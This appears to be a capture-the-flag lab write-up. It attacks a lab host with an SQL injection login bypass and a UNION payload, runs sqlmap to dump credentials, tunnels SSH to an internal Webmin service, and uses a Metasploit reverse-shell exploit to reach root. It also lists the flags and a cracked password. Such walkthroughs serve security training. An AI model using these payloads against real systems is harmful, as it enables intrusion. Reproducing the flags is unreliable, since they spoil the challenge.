## NMAP

nmap -sV -o -T4 -Pn 10.10.190.211 -oN nmap/initial

### 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
### 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

SQL Injection in Login form

username : ' or 1=1: -
password : 

Access granted : portal.php

' UNION SELECT table_name,NULL,NULL FROM information_schema.tables: -

## SQLMAP

Capture request usign burp and store in file

sqlmap -r request.txt --dbms=mysql --dump

User : agent47
Hash : ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
Password : videogamer124

Tables : post, users

## SSH

ssh agent47@10.10.190.211

Flag 1 : 649ac17b1480ac13ef1e4fa579dac95c

## SSH Tunneling

ss -tulpn

ssh -L 10000:localhost:10000 agent47@10.10.190.211

Version : 1.580

## Metasploit

Exploit : exploit/unix/webapp/webmin_show_cgi_exec
Payload : cmd/unix/reverse

Important : Server is accesible in our localhost so set RHOSTS 127.0.0.1

Exploit. Done

Root Flag : a4b945830144bdd71908d12d902adeee
